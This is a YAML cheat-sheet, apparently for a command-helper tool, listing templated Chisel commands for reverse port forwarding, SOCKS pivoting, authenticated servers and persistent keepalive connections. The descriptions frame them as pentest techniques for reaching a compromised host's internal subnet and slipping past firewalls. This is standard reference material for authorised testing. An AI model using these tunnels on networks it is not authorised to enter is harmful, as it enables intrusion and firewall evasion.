@@ -1,0 +1,87 @@
+tool: chisel
+tags: [network, tunneling, pivoting, proxy, security, pentest, port-forwarding, socks]
+
+actions:
+  # === SERVER CONFIGURATION ===
+  - title: chisel - basic server listener
+    desc: |
+      Starts a basic Chisel server listening on a specific port. This command is 
+      typically run on the attacker's machine to receive connections from the victim. 
+      It creates the infrastructure for SSH-over-HTTP tunnels but does not allow 
+      reverse tunneling by default.
+    command: "chisel server --port {{listen_port|8080}}"
+
+  - title: chisel - server with reverse tunneling
+    desc: |
+      Starts a Chisel server that allows clients to request reverse port forwarding. 
+      The --reverse flag is essential for most penetration testing scenarios where 
+      the attacker needs to reach services inside a private network. It enables 
+      the client to establish a tunnel that points back to its own network.
+    command: "chisel server --port {{listen_port|8080}} --reverse"
+
+  - title: chisel - authenticated server
+    desc: |
+      Runs a Chisel server requiring a username and password for all incoming connections. 
+      This is a critical security measure when exposing the Chisel server to the public 
+      internet to prevent unauthorized pivoting. The format for credentials is 
+      user:pass, and multiple users can be specified.
+    command: "chisel server --port {{listen_port|8080}} --auth {{user:pass}} --reverse"
+
+  # === CLIENT TUNNELING ===
+  - title: chisel - local port forwarding
+    desc: |
+      Connects to a Chisel server and maps a local port on the client machine to 
+      a destination reachable by the server. Traffic sent to the client's local 
+      port will be tunneled through Chisel to the target address via the server. 
+      This is useful for bypassing outbound firewalls to reach specific services.
+    command: "chisel client {{server_ip}}:{{server_port}} {{local_port}}:{{remote_target}}:{{remote_port}}"
+
+  - title: chisel - remote port forwarding (reverse)
+    desc: |
+      Connects to a Chisel server and maps a port on the server machine back to 
+      a destination reachable by the client. This allows the attacker (server) 
+      to access services inside the victim's (client) network. Note that the 
+      server must be started with the --reverse flag for this to function.
+    command: "chisel client {{server_ip}}:{{server_port}} R:{{server_listen_port}}:{{target_addr}}:{{target_port}}"
+
+  # === SOCKS PROXYING ===
+  - title: chisel - dynamic socks proxy
+    desc: |
+      Sets up a SOCKS5 proxy on the client machine that tunnels traffic through 
+      the Chisel server. This allows the client to use any tool (like a browser 
+      or proxychains) to route traffic through the server's network location. 
+      The default SOCKS port used in Chisel's internal logic is 1080.
+    command: "chisel client {{server_ip}}:{{server_port}} {{local_socks_port|1080}}:socks"
+
+  - title: chisel - reverse socks proxy
+    desc: |
+      Creates a SOCKS5 proxy on the server machine that routes traffic through 
+      the client machine into the client's internal network. This is the most 
+      common pivoting technique, allowing the attacker to reach the entire internal 
+      subnet of a compromised host. Requires the server to have --reverse enabled.
+    command: "chisel client {{server_ip}}:{{server_port}} R:{{socks_port|1080}}:socks"
+
+  # === SECURITY AND OPTIMIZATION ===
+  - title: chisel - secure client with fingerprint
+    desc: |
+      Connects to a server while verifying its TLS fingerprint to prevent 
+      Man-in-the-Middle (MITM) attacks. The fingerprint is displayed by the 
+      server when it starts up. This ensures that the client is only talking 
+      to the intended, authorized Chisel server.
+    command: "chisel client --fingerprint {{fingerprint}} {{server_ip}}:{{server_port}} R:socks"
+
+  - title: chisel - optimized tunnel with compression
+    desc: |
+      Enables GZIP compression on the tunnel stream to reduce bandwidth usage. 
+      This is particularly useful when tunneling large amounts of data or 
+      operating over slow network connections. It may slightly increase CPU 
+      usage on both ends but usually results in better perceived performance.
+    command: "chisel client {{server_ip}}:{{server_port}} --compress R:socks"
+
+  - title: chisel - persistent client connection
+    desc: |
+      Configures the client to attempt to reconnect indefinitely if the connection 
+      is lost. The --keepalive flag sends heartbeat packets to prevent firewall 
+      timeouts from closing the connection. This is vital for maintaining a 
+      stable foothold in a long-term engagement.
+    command: "chisel client --keepalive {{interval|30s}} {{server_ip}}:{{server_port}} R:socks"
